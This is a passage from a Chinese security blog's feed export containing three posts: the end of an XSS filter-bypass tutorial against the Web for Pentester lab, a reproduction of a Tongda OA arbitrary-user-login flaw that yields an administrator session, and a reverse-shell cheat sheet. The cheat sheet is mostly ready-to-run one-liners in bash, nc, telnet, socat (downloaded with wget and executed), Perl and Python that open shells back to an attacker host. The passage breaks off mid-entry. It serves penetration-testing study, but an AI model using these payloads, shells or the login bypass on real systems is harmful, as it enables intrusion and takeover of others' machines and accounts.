class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCript&gt;alert(1);&lt;/scRipt&gt;</span><br></pre></td></tr></table></figure><p><strong>payload - 3</strong></p><p>递归构造法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pent&lt;&lt;est&lt;script&gt;erL&gt;ab&gt;&gt;</span><br></pre></td></tr></table></figure><p><strong>payload - 4</strong></p><p>递归构造法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1);&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure><p><strong>payload - 5</strong></p><p>查看代码部分的关键词是否被限制了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert</span><br></pre></td></tr></table></figure><p><strong>payload - 6</strong></p><p>测试img标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=prompt(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>payload - 7</strong></p><p>测试div标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div onmouseover=alert(1)&gt;1&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="基本混淆"><a href="#基本混淆" class="headerlink" title="基本混淆"></a>基本混淆</h3><p>大小写混合</p><p>宽字节</p><h2 id="XSS靶场"><a href="#XSS靶场" class="headerlink" title="XSS靶场"></a>XSS靶场</h2><h3 id="web-for-pentester"><a href="#web-for-pentester" class="headerlink" title="web for pentester"></a>web for pentester</h3><p><strong>官网：</strong><a href="https://pentesterlab.com/">https://pentesterlab.com/</a></p><p><strong>下载地址</strong>：<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso">https://isos.pentesterlab.com/web_for_pentester_i386.iso</a></p><p><strong>安装方法</strong>：通过虚拟机挂载iso运行，该靶场环境是封装在<code>debian</code>系统里面的，运行在时候直接以<code>Live</code>方式运行，然后<code>ifconfig</code>查看下ip地址，在浏览器输入IP地址即可。</p><p><img src="/.io//penter.png"></p><h4 id="Example-1-–-无任何过滤"><a href="#Example-1-–-无任何过滤" class="headerlink" title="Example 1 – 无任何过滤"></a>Example 1 – 无任何过滤</h4><p><img src="/.io//e1.png"></p><p><strong>测试</strong></p><p><code>name=xss</code>、<code>name=&lt;h1&gt;xss&lt;/h1&gt;</code>观察页面，并查看源代码，发现输出是在标签外，则不需要闭合标签。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example1.php?name=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/.io//e12.png"></p><h4 id="Example-2-–-大小写绕过"><a href="#Example-2-–-大小写绕过" class="headerlink" title="Example 2 – 大小写绕过"></a>Example 2 – 大小写绕过</h4><p><strong>思路</strong></p><ol><li><p>和Example 1一样，先随便输入一下数据测试，通过观察结果，可以判断name参数的注入点没有过滤尖括号<code>&lt;&gt;</code>。</p></li><li><p>用基本语句测试 <code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，发现页面中只剩下的<code>alert(&quot;xss&quot;)</code>，<code>&lt;script&gt;&lt;/script&gt;</code>被过滤了，那么就需要绕过过滤。</p></li><li><p>尝试大小写转换，输入<code>&lt;Script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，发现页面中前一个<code>&lt;Script&gt;</code>没有被过滤，只有后一个<code>&lt;/script&gt;</code>被过滤了</p><p><img src="/.io//e2.png"></p><p>那么大小写是可以绕过过滤的，输入：<code>&lt;Script&gt;alert(&quot;xss&quot;)&lt;/Script&gt;</code></p></li></ol><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example2.php?name=&lt;Script&gt;alert(&quot;xss&quot;)&lt;/Script&gt;</span><br></pre></td></tr></table></figure><h4 id="Example-3-–-嵌套绕过"><a href="#Example-3-–-嵌套绕过" class="headerlink" title="Example 3 – 嵌套绕过"></a>Example 3 – 嵌套绕过</h4><p><strong>思路</strong></p><ol><li>经过上面的测试，没有过滤<code>alert(&#39;xss&#39;)</code>,现在就把注意力集中在 <code>&lt;script&gt;</code> 和<code>&lt;/script&gt;</code>上</li><li>使用过滤测试Example 2 payload探测。观察到结果中有一部分尖括号被过滤，但也有部分尖括号未被过滤。</li><li>构造payload</li></ol><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">example3.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(1);&lt;/sc&lt;/script&gt;ript&gt;</span><br><span class="line">或</span><br><span class="line">example3.php?name=&lt;script &gt;alert(1)&lt;/script &gt;</span><br></pre></td></tr></table></figure><h4 id="Example-4-–-script直接被过滤，用其他标签"><a href="#Example-4-–-script直接被过滤，用其他标签" class="headerlink" title="Example 4 – script直接被过滤，用其他标签"></a>Example 4 – script直接被过滤，用其他标签</h4><p><strong>思路</strong></p><p><code>script</code>这个关键词被禁用。考虑用其他标签触发<code>XSS</code>。最常用的还是<code>img</code>标签。<br>除了<code>img</code>标签以外，还可以考虑<code>a</code>标签和<code>div</code>标签等。</p><p>触发函数有 <code>onerror</code>, <code>onmouseover</code>, <code>onmouseout</code>, <code>onmousemove</code>, <code>onclick</code>。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;img src=1 onerror=&#x27;alert(1)&#x27;&gt;</span><br><span class="line">&lt;img src=1 onerror=&#x27;alert(1)&#x27; /&gt;</span><br><span class="line">&lt;img src=&#x27;1&#x27; onerror=&#x27;alert(1)&#x27; /&gt;</span><br><span class="line">&lt;img src=&quot;1&quot; onerror=&#x27;alert(1)&#x27; /&gt;</span><br><span class="line">&lt;img src=1 onmouseover=alert(1)&gt;</span><br><span class="line">&lt;a href=1 onmouseover=alert(1)&gt;1&lt;/a&gt;</span><br><span class="line">&lt;div onclick=alert(1)&gt;1&lt;/div&gt;</span><br><span class="line">&lt;div onmouseover=alert(1)&gt;1&lt;/div&gt;</span><br><span class="line">&lt;img src=1 onmouseover=prompt(1)&gt;</span><br><span class="line">&lt;img src=1 onmouseover=confirm(1)&gt;</span><br></pre></td></tr></table></figure><h4 id="Example-5-–-String-fromCharCode编码绕过"><a href="#Example-5-–-String-fromCharCode编码绕过" class="headerlink" title="Example 5 – String.fromCharCode编码绕过"></a>Example 5 – String.fromCharCode编码绕过</h4><p><strong>思路</strong></p><p><code>alert</code>被限制的情况。</p><p>绕过思路1,不使用<code>alert</code>而用其他的类似函数,比如<code>confirm</code>和<code>prompt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>绕过思路2,编码函数名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="Example-6-–-—–标签内-闭合标签"><a href="#Example-6-–-—–标签内-闭合标签" class="headerlink" title="Example 6 – —–标签内,闭合标签"></a>Example 6 – <script></script>—–标签内,闭合标签</h4><p>直接注入JavaScript代码中。<br>不闭合<code>script</code>标签的情况，可以考虑用<code>//</code>注释后面的代码</p><p>在一个<code>script</code>的标签内，先实现闭合<code>&quot;;alert(1)//,&quot;</code>;用来闭合前面，<code>//</code>注释后面。将<code>hello，hacker</code>的地方写一个<code>alert(1)</code>即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;alert(1)//</span><br><span class="line">&quot;;alert(1);var a=&quot;</span><br></pre></td></tr></table></figure><p>顺带再闭合一下<code>script</code>标签也不是不可以，只是有点多此一举。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;&lt;/script&gt;&lt;script&gt;alert(1)//</span><br><span class="line">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure><h4 id="Example-7-–-标签内—–闭合标签"><a href="#Example-7-–-标签内—–闭合标签" class="headerlink" title="Example 7 – 标签内—–闭合标签"></a>Example 7 – <script></script>标签内—–闭合标签</h4><p>左右尖括号和双引号<code>&lt;,&gt;,&quot;</code>被HTML encoding。<br>如上个例子所述，其实并不需要用到尖括号，并且可以用单引号分割。<br>(用双引号还是单引号分割得看目标页面的代码怎么写，类似于python)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert(1)//</span><br></pre></td></tr></table></figure><h4 id="Example-8-–-有过滤，表单"><a href="#Example-8-–-有过滤，表单" class="headerlink" title="Example 8 – 有过滤，表单"></a>Example 8 – 有过滤，表单</h4><p>对尖括号进行的过滤，转义；<br>有一个表单：输入<code>xxxx</code>点击提交，查看源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HELLO xxxxx&lt;form action=&quot;/xss/example8.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">  Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</span><br></pre></td></tr></table></figure><p>尖括号无法绕过，然后发现表单的url可以被重置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xss/example8.php//%22%20onsubmit=%22alert(&#x27;1&#x27;)</span><br></pre></td></tr></table></figure><p>然后点击提交，会触发弹窗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/xss/example8.php/&quot; onsubmit=&quot;alert(&#x27;1&#x27;)&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">  Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</span><br></pre></td></tr></table></figure><h4 id="Example-9-–-直接在-后面添加alert-1"><a href="#Example-9-–-直接在-后面添加alert-1" class="headerlink" title="Example 9 – 直接在#后面添加alert(1)"></a>Example 9 – 直接在#后面添加alert(1)</h4><p>DOM型 XSS 的典型代表，恶意输入并没有直接反映在返回的HTML中，而要依赖浏览器动态执行JavaScript之后，恶意输入才能被执行。</p><p>把URL改成<code>http://192.168.150.157/xss/example9.php#alert(1)</code><br>首先看到代码里有<code> document.write(location.hash.substring(1));&lt;/script&gt;</code>，所以显然入口在这里。<br><code>document.write()</code>是把括号中的内容写到<code>HTML</code>文档中，<code>location.hash</code>就是得到<code>URL</code>中<code>#</code>开始的字符串，<code>substring(1)</code>就得到了<code>#</code>后的字符串。<br>所以就在#后加入payload：<code>#alert(1)</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;h3 id=&quot;什么是XSS&quot;&gt;&lt;a href=&quot;#什么是XSS&quot; class=&quot;headerlink&quot; title=&quot;什么是XSS&quot;&gt;&lt;/a&gt;什</summary>
      
    
    
    
    <category term="WEB" scheme="http://lvpsectime.github.io/categories/WEB/"/>
    
    
    <category term="XSS" scheme="http://lvpsectime.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>通达OA任意用户登录复现</title>
    <link href="http://lvpsectime.github.io/2020/04/27/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%8D%E7%8E%B0/"/>
    <id>http://lvpsectime.github.io/2020/04/27/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-04-27T09:25:35.000Z</published>
    <updated>2020-04-27T12:16:41.290Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/.io//login.png" alt="login"></p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>通达OA是北京通达信科科技有限公司出品的 “Office Anywhere 通达网络智能办公系统”。<br>该漏洞可获取任意用户session，包括系统管理员。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通达OA 2017</span><br><span class="line">V11.3 &lt; V11.5</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本次实验所用版本是<code>通达V11.3</code></p><p>链接：<a href="https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q">https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q</a></p><p>提取码：z863</p><p>下载好源码，解压缩后直接运行exe文件安装，访问靶机IP即可，界面如上图。</p><p>本机IP：<code>192.168.150.142</code></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li><p>登录页面直接抓包</p><p><img src="/.io//logincheck.png" alt="logincheck"></p></li><li><p>此处需要修改3个地方</p><ol><li><code>/logincheck.php</code> 修改为 <code>logincheck_code.php</code></li><li>删除<code>Cookie</code>，否则不会返回<code>PHPSESSID</code></li><li>在<code>POST</code>处添加 <code>&amp;UID=1</code>，代表管理员</li></ol><p><img src="/.io//get_sessid.png" alt="get_sessid"></p><p>成功获取PHPSESSID。</p></li><li><p>利用获得的<code>PHPSESSID</code>登录</p><p>访问<code>http://192.168.150.142/general/index.php</code>抓包并替换<code>PHPSESSID</code></p><p>或者</p><p>访问<code>http://192.168.150.142/general/index.php</code>直接F12，修改<code>PHPSESSID</code>，然后刷新即可登录。</p><p><img src="/.io//success.png" alt="success"></p></li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>poc地址：<a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User">点我</a></p><p>使用方法：</p><ol><li><p>运行poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 POC.py -v 版本 -url url</span><br><span class="line">// 版本：11 或 2017</span><br><span class="line">// url: IP 或 http://IP</span><br></pre></td></tr></table></figure></li><li><p>获取到可用的SESSIONID</p></li><li><p>替换浏览器Cookie中的SESSIONID即可实现登录为admin</p></li></ol><p><img src="/.io//poc.png" alt="poc"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/.io//login.png&quot; alt=&quot;login&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h2&gt;&lt;p&gt;通达OA是北京通达信科科技有限</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://lvpsectime.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://lvpsectime.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell备忘录</title>
    <link href="http://lvpsectime.github.io/2020/04/27/%E5%8F%8D%E5%BC%B9shell%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>http://lvpsectime.github.io/2020/04/27/%E5%8F%8D%E5%BC%B9shell%E5%A4%87%E5%BF%98%E5%BD%95/</id>
    <published>2020-04-27T01:30:53.000Z</published>
    <updated>2020-12-08T06:53:30.413Z</updated>
    
    <content type="html"><![CDATA[<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>shell分为两种，一种是正向shell，另一种是反向shell。</p><p>如果客户端连接服务器，客户端主动连接服务器，就称为正向shell。</p><p>如果客户端连接服务器，服务器想要获得客户端的shell，就称为反向shell。反向shell通常在开启了防护措施的目标机器上，例如防火墙、端口转发等。</p><p>环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机：10.10.10.11</span><br><span class="line">端口：4444</span><br></pre></td></tr></table></figure><h2 id="Linux-nc"><a href="#Linux-nc" class="headerlink" title="Linux nc"></a>Linux nc</h2><h3 id="相互通信"><a href="#相互通信" class="headerlink" title="相互通信"></a>相互通信</h3><p>在主机<code>192.168.150.142</code>的<code>4444</code>端口启动服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v -l 192.168.150.152 4444</span><br></pre></td></tr></table></figure><p>在另一台主机上进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v 192.168.15.142 4444</span><br></pre></td></tr></table></figure><p>连接成功后，可以在当前机器输入信息，且会在目标机器显示；反之，在被控端输入，也会在当前控制端显示</p><p>默认为tcp连接，可以添加参数<code>-u</code>改为udp连接</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h4 id="正向反弹shell"><a href="#正向反弹shell" class="headerlink" title="正向反弹shell"></a>正向反弹shell</h4><p>首先服务器端进行监听并反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234 -e /bin/bash</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>-p：指定端口</li></ul><p>之后本地连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.80.129 1234</span><br></pre></td></tr></table></figure><p>即可获得服务器端的shell</p><h4 id="反向反弹shell"><a href="#反向反弹shell" class="headerlink" title="反向反弹shell"></a>反向反弹shell</h4><p>首先本地进行监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure><p>之后服务端反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 1234</span><br></pre></td></tr></table></figure><p>同样可获得服务器端的shell</p><p><strong>正向shell：</strong>本地或vps将自己的shell传给服务器（端口监听在服务器上）。<br><strong>反弹shell：</strong>目标机器将shell主动传给本地或vps（端口监听在本地vps上）。</p><h2 id="Linux-bash"><a href="#Linux-bash" class="headerlink" title="Linux bash"></a>Linux bash</h2><p><strong>反弹TCP协议shell</strong></p><p>本地监听TCP协议4444端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.10.11/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/10.10.10.11/4444 0&lt;&amp; 2&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/10.10.10.11/443;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec /bin/sh 0&lt;/dev/tcp/10.10.10.11/443 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.10.11/443; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><p><strong>反弹UDP协议shell</strong></p><p>本地监听<code>4444</code>端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -u -lvp 4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/udp/10.10.10.11/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><strong>解释：</strong></p><ul><li>-i：产生交互的shell</li><li>/dev/tcp/ip/port：读取或写入相当于进行socket调用</li></ul><h2 id="Ncat反弹shell"><a href="#Ncat反弹shell" class="headerlink" title="Ncat反弹shell"></a>Ncat反弹shell</h2><p>本地监听<code>4444</code>端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.10.11/443; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat --udp 10.10.10.11 443 -e /bin/bash</span><br></pre></td></tr></table></figure><h2 id="Telnet反弹shell"><a href="#Telnet反弹shell" class="headerlink" title="Telnet反弹shell"></a>Telnet反弹shell</h2><p>本地监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet 10.10.10.11 443 0/tmp/p 2&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.10.10.11 443 | /bin/bash | telnet 10.10.10.11 444</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|telnet 10.10.10.11 443 &gt; f</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f x; mknod x p &amp;&amp; telnet 10.10.10.11 443 0&lt;x | /bin/bash 1&gt;x</span><br></pre></td></tr></table></figure><h2 id="Socat反弹shell"><a href="#Socat反弹shell" class="headerlink" title="Socat反弹shell"></a>Socat反弹shell</h2><p>本地监听TCP协议<code>4444</code>端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat file:`tty`,raw,echo=0 TCP-L:4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:10.10.10.11:4444</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-connect:10.10.10.11:4444 exec:&quot;bash -li&quot;,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:10.10.10.11:4444</span><br></pre></td></tr></table></figure><h2 id="Perl脚本反弹shell"><a href="#Perl脚本反弹shell" class="headerlink" title="Perl脚本反弹shell"></a>Perl脚本反弹shell</h2><p>本地监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;10.10.10.11&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.10.10.11:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure><p>win平台执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#x27;$c=new IO::Socket::INET(PeerAddr,&quot;10.10.10.11:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure><h2 id="Python脚本反弹shell"><a href="#Python脚本反弹shell" class="headerlink" title="Python脚本反弹shell"></a>Python脚本反弹shell</h2><p>本地监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><p>IPV4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.11&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export RHOST=&quot;10.10.10.11&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.11&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>IPV6</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 